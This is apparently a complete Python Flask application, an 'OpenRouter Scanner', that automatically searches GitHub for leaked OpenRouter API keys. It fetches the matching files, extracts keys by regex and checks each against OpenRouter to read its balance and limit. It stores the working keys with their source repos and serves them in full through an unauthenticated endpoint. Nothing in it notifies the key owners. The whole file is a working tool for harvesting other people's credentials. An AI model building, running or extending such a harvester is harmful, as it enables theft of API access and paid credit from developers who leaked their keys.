#!/usr/bin/env python3
"""
OpenRouter Scanner - 现代化Web版
完全通过Web界面配置和管理
"""

from flask import Flask, render_template, jsonify, request, send_from_directory
from flask_cors import CORS
from flask_socketio import SocketIO, emit
import threading
import time
import re
import json
import sqlite3
import requests
from datetime import datetime
from typing import Dict, List, Any, Optional
import os
import base64

app = Flask(__name__)
app.config['SECRET_KEY'] = 'openrouter-scanner-secret-key'

# 允许的跨域来源（以逗号分隔），未设置则允许所有
ALLOWED_ORIGINS = os.environ.get('ALLOWED_ORIGINS', '*')
if ALLOWED_ORIGINS and ALLOWED_ORIGINS != '*':
    CORS(app, resources={r"/*": {"origins": [o.strip() for o in ALLOWED_ORIGINS.split(',') if o.strip()]}})
else:
    CORS(app)

socketio = SocketIO(app, cors_allowed_origins="*")

# ============ Server/Env Config ============
ADMIN_BEARER = os.environ.get('ADMIN_BEARER')
DB_PATH = os.environ.get('SCANNER_DB_PATH', 'scanner.db')
OPENROUTER_VALIDATION_ENDPOINT = os.environ.get(
    'OPENROUTER_VALIDATION_ENDPOINT',
    'https://openrouter.ai/api/v1/auth/key'
)
OPENROUTER_TIMEOUT = int(os.environ.get('OPENROUTER_TIMEOUT', '10'))
HOST = os.environ.get('HOST', '0.0.0.0')
PORT = int(os.environ.get('PORT', '5000'))
DEBUG = os.environ.get('DEBUG', 'false').lower() in ('1', 'true', 'yes')

# 全局变量
scanner_thread = None
scanner_running = False
config = {
    'github_tokens': [],
    'scan_queries': [
        '"sk-or-v1-" extension:json',
        '"sk-or-v1-" extension:env',
        '"sk-or-" filename:.env',
        '"openrouter" "api_key"',
        '"OPENROUTER_API_KEY"'
    ],
    'scan_interval': 60,  # 秒
    'max_results_per_query': 100
}

# 数据库初始化
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS keys (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            key_value TEXT UNIQUE,
            balance REAL,
            limit_amount REAL,
            is_free_tier BOOLEAN,
            source_repo TEXT,
            source_url TEXT,
            found_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            last_checked TIMESTAMP
        )
    ''')
    c.execute('''
        CREATE TABLE IF NOT EXISTS scan_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            message TEXT,
            level TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    # 配置持久化表
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS app_config (
            key TEXT PRIMARY KEY,
            value TEXT
        )
    ''')
    conn.commit()
    conn.close()

# OpenRouter Key 验证
# 配置持久化工具函数

def _config_set(key: str, value: Any):
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("INSERT OR REPLACE INTO app_config (key, value) VALUES (?, ?)", (key, json.dumps(value, ensure_ascii=False)))
        conn.commit()
    finally:
        conn.close()


def _config_get(key: str, default: Any = None) -> Any:
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT value FROM app_config WHERE key=?", (key,))
        row = c.fetchone()
        if not row:
            return default
        return json.loads(row[0])
    except Exception:
        return default
    finally:
        conn.close()


def load_persisted_config():
    global config
    persisted = _config_get('web_config', None)
    if isinstance(persisted, dict):
        # 只更新存在的键，避免结构变化导致 KeyError
        for k in list(config.keys()):
            if k in persisted:
                config[k] = persisted[k]


def save_persisted_config():
    _config_set('web_config', config)

def validate_openrouter_key(api_key: str) -> Dict:
    """验证 OpenRouter API Key 并获取余额"""
    try:
        headers = {
            "Authorization": f"Bearer {api_key}",
            "Content-Type": "application/json"
        }

        response = requests.get(
            OPENROUTER_VALIDATION_ENDPOINT,
            headers=headers,
            timeout=OPENROUTER_TIMEOUT
        )

        if response.status_code == 200:
            data = response.json()
            return {
                "valid": True,
                "balance": data.get("data", {}).get("usage", 0),
                "limit": data.get("data", {}).get("limit", 0),
                "is_free_tier": data.get("data", {}).get("is_free_tier", False)
            }
        else:
            return {"valid": False}
    except Exception as e:
        log_message(f"验证失败: {str(e)}", "error")
        return {"valid": False}

# GitHub 搜索
def search_github(query: str, token: str) -> List[Dict]:
    """搜索 GitHub 代码"""
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }

    results = []
    try:
        response = requests.get(
            "https://api.github.com/search/code",
            headers=headers,
            params={"q": query, "per_page": 100},
            timeout=30
        )

        if response.status_code == 200:
            data = response.json()
            results = data.get("items", [])
        else:
            log_message(f"GitHub API 错误: {response.status_code}", "error")
    except Exception as e:
        log_message(f"搜索失败: {str(e)}", "error")

    return results

# 获取文件内容
def get_file_content(item: Dict, token: str) -> Optional[str]:
    """获取 GitHub 文件内容"""
    try:
        repo = item["repository"]["full_name"]
        path = item["path"]

        # 尝试使用 raw.githubusercontent.com
        raw_url = f"https://raw.githubusercontent.com/{repo}/main/{path}"
        response = requests.get(raw_url, timeout=10)

        if response.status_code == 200:
            return response.text

        # 尝试 master 分支
        raw_url = f"https://raw.githubusercontent.com/{repo}/master/{path}"
        response = requests.get(raw_url, timeout=10)

        if response.status_code == 200:
            return response.text

    except Exception:
        pass

    return None

# 提取 OpenRouter Keys
def extract_openrouter_keys(content: str) -> List[str]:
    """从内容中提取 OpenRouter keys"""
    pattern = r'(sk-or-[A-Za-z0-9\-_]{20,60})'
    keys = re.findall(pattern, content)
    # 去重
    return list(set(keys))

# 日志记录
def log_message(message: str, level: str = "info"):
    """记录日志并发送到前端"""
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT INTO scan_logs (message, level) VALUES (?, ?)", (message, level))
    conn.commit()
    conn.close()

    # 发送到前端
    socketio.emit('log', {'message': message, 'level': level, 'time': datetime.now().isoformat()})

# 保存 Key 到数据库
def save_key(key: str, info: Dict, source: Dict):
    """保存发现的 key"""
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()

    try:
        c.execute("""
            INSERT OR REPLACE INTO keys
            (key_value, balance, limit_amount, is_free_tier, source_repo, source_url, last_checked)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        """, (
            key,
            info.get('balance', 0),
            info.get('limit', 0),
            info.get('is_free_tier', False),
            source.get('repo', ''),
            source.get('url', ''),
            datetime.now()
        ))
        conn.commit()

        # 通知前端
        socketio.emit('new_key', {
            'key': key[:10] + '...' + key[-5:],
            'balance': info.get('balance', 0),
            'limit': info.get('limit', 0),
            'source': source.get('repo', '')
        })

    except Exception as e:
        log_message(f"保存 key 失败: {str(e)}", "error")
    finally:
        conn.close()

# 扫描线程
def scanner_worker():
    """后台扫描线程"""
    global scanner_running

    while scanner_running:
        if not config['github_tokens']:
            log_message("未配置 GitHub Token", "warning")
            time.sleep(30)
            continue

        for query in config['scan_queries']:
            if not scanner_running:
                break

            log_message(f"搜索: {query}", "info")

            for token in config['github_tokens']:
                results = search_github(query, token)

                for item in results[:config['max_results_per_query']]:
                    if not scanner_running:
                        break

                    # 获取文件内容
                    content = get_file_content(item, token)
                    if not content:
                        continue

                    # 提取 keys
                    keys = extract_openrouter_keys(content)

                    for key in keys:
                        # 验证 key
                        info = validate_openrouter_key(key)

                        if info['valid']:
                            log_message(f"✅ 发现有效 Key: {key[:10]}...，余额: ${info['balance']}", "success")
                            save_key(key, info, {
                                'repo': item['repository']['full_name'],
                                'url': item['html_url']
                            })
                        else:
                            log_message(f"❌ 无效 Key: {key[:10]}...", "warning")

                    time.sleep(1)  # 避免太快

                # 避免 API 限流
                time.sleep(2)

        log_message(f"扫描完成，{config['scan_interval']}秒后继续", "info")
        time.sleep(config['scan_interval'])

# 简单的管理口令校验
from functools import wraps

def require_admin(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        if not ADMIN_BEARER:
            return f(*args, **kwargs)
        auth = request.headers.get('Authorization', '')
        if auth.startswith('Bearer '):
            token = auth.split(' ', 1)[1].strip()
            if token == ADMIN_BEARER:
                return f(*args, **kwargs)
        return jsonify({'error': 'unauthorized'}), 401
    return wrapper

# Flask 路由
@app.route('/')
def index():
    """主页"""
    return render_template('index.html')

@app.route('/api/config', methods=['GET', 'POST'])
@require_admin
def api_config():
    """获取/更新配置（POST 需管理口令）"""
    global config

    if request.method == 'POST':
        data = request.json or {}
        config.update(data)
        save_persisted_config()
        return jsonify({'status': 'success', 'config': config})

    return jsonify(config)

@app.route('/api/start', methods=['POST'])
@require_admin
def start_scan():
    """开始扫描（需管理口令）"""
    global scanner_thread, scanner_running

    if scanner_running:
        return jsonify({'status': 'already_running'})

    scanner_running = True
    scanner_thread = threading.Thread(target=scanner_worker, daemon=True)
    scanner_thread.start()

    log_message("🚀 扫描已启动", "success")
    return jsonify({'status': 'started'})

@app.route('/api/stop', methods=['POST'])
@require_admin
def stop_scan():
    """停止扫描（需管理口令）"""
    global scanner_running

    scanner_running = False
    log_message("⏹️ 扫描已停止", "warning")
    return jsonify({'status': 'stopped'})

@app.route('/api/keys', methods=['GET'])
def get_keys():
    """获取所有发现的 keys"""
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("""
        SELECT key_value, balance, limit_amount, is_free_tier, source_repo, source_url, found_at, last_checked
        FROM keys
        ORDER BY found_at DESC
    """)

    keys = []
    for row in c.fetchall():
        keys.append({
            'key': row[0],
            'key_display': row[0][:15] + '...' + row[0][-5:],
            'balance': row[1],
            'limit': row[2],
            'is_free_tier': row[3],
            'source_repo': row[4],
            'source_url': row[5],
            'found_at': row[6],
            'last_checked': row[7]
        })

    conn.close()
    return jsonify(keys)

@app.route('/api/logs', methods=['GET'])
def get_logs():
    """获取日志"""
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("""
        SELECT message, level, timestamp
        FROM scan_logs
        ORDER BY id DESC
        LIMIT 100
    """)

    logs = []
    for row in c.fetchall():
        logs.append({
            'message': row[0],
            'level': row[1],
            'timestamp': row[2]
        })

    conn.close()
    return jsonify(logs)
@app.route('/api/health', methods=['GET'])
def health():
    return jsonify({'status': 'ok', 'running': scanner_running}), 200


@app.route('/api/status', methods=['GET'])
def get_status():
    """获取扫描状态"""
    return jsonify({
        'running': scanner_running,
        'tokens_count': len(config['github_tokens']),
        'queries_count': len(config['scan_queries'])
    })

if __name__ == '__main__':
    init_db()
    load_persisted_config()

    socketio.run(app, host=HOST, port=PORT, debug=DEBUG)